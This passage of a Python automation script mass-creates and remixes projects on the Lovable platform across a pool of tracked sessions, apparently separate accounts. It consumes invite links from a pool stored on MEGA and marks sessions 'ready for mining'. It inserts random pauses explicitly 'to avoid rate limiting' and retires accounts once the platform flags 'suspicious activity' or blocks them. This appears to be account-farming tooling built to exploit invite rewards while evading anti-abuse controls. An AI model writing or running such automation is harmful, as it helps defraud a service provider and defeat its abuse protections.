                    if session:
                        db.update_session(session_key, projects_created=session.get("projects_created", 0) + 1)
                        # Mark session as active (ready for mining)
                        db.set_session_status(session_key, "active")
                    else:
                        db.add_session(session_key, config["email"], "active")
                        db.update_session(session_key, projects_created=1)
                    save_db(db)

                # FIRST-HEAVY: #1 becomes the clone source for #2..N
                if use_first_heavy and i == 0:
                    first_url = project_info["chat_url"]
                    log(f"🔥 FIRST-HEAVY #1 saved as clone source: {first_url}")

                print(f"\n✅ Project {project_id} created successfully!")
                print(f"   Mode: {mode}")
                print(f"   Feature: {'added' if feature_added else 'FAILED'} (cmd: {cmd_name})")
                print(f"   Chat: {project_info['chat_url']}")
                print(f"   Preview: {project_info['preview_url']}")
                print(f"   Public: https://{project_id}.lovableproject.com")
                print(f"   Invite: {invite_link}")
                
                # Increment usage on the consumed invite and re-upload pool
                if mode == "accept" and invite_pool and used_invite_link:
                    invite_pool = increment_invite_usage(invite_pool, used_invite_link)
                    mega_upload_invites(invite_pool)
                
                # Brief pause between projects to avoid rate limiting
                if i < count - 1:
                    pause = random.randint(5, 10)
                    print(f"\n⏳ Waiting {pause}s before next project...")
                    await asyncio.sleep(pause)
                
            except Exception as e:
                print(f"❌ Failed to create project {i+1}: {e}")
                import traceback
                traceback.print_exc()

                # Account bounced to login -> truly red
                if await check_bounce(page, session_id, session_key, config):
                    break

                # Persist flag to DB if session expired/blocked (truly_red when account is lost)
                if "SESSION EXPIRED" in str(e) or "suspicious activity" in str(e).lower() or "ACCOUNT BLOCKED" in str(e):
                    new_status = "truly_red" if "TRULY RED" in str(e) else "red"
                    print(f"\n💀 Session flagged - marking {new_status} + stopping creation")
                    try:
                        with mega_distributed_lock(timeout=600):
                            db = load_db()
                            if db.get_session(session_key):
                                db.update_session(session_key, status=new_status, flag_reason=str(e)[:200])
                            save_db(db)
                    except Exception as db_err:
                        print(f"⚠️  Failed to flag red in DB: {db_err}", "WARNING")
                    break

                # Remix menu/dropdown not found or button inactive -> kill and retry whole script
                retryable = any(msg in str(e) for msg in (
                    "Menu dropdown never appeared after clicking 3-dot",
                    "Project menu button not found after retries",
                    "Remix menu item not appearing after 3 clicks",
                    "Remix dialog never appeared",
                ))
                if retryable:
                    print("\n🔄 Remix menu/dropdown not found or button inactive - script will be killed and re-run")
                    return "retry"
    
    print("\n" + "=" * 60)
    print("🎉 Script 2 complete!")
    db.print_stats()
    print("=" * 60)
    return "done"


if __name__ == "__main__":
    max_attempts = 3
    for attempt in range(1, max_attempts + 1):
        try:
            print(f"\n{'#' * 60}")
            print(f"# ATTEMPT {attempt}/{max_attempts}")
            print(f"{'#' * 60}")
            result = asyncio.run(main())
            if result == "retry" and attempt < max_attempts:
                print(f"\n🔁 Retrying script ({attempt+1}/{max_attempts})...")
                continue
            break
        except KeyboardInterrupt:
            print("\n⚠️  Interrupted by user")
            break
        except Exception as e:
            print(f"\n❌ Fatal error: {e}")
            import traceback
            traceback.print_exc()
            if attempt < max_attempts:
                print(f"\n🔁 Fatal error - retrying ({attempt+1}/{max_attempts})...")
                continue
            break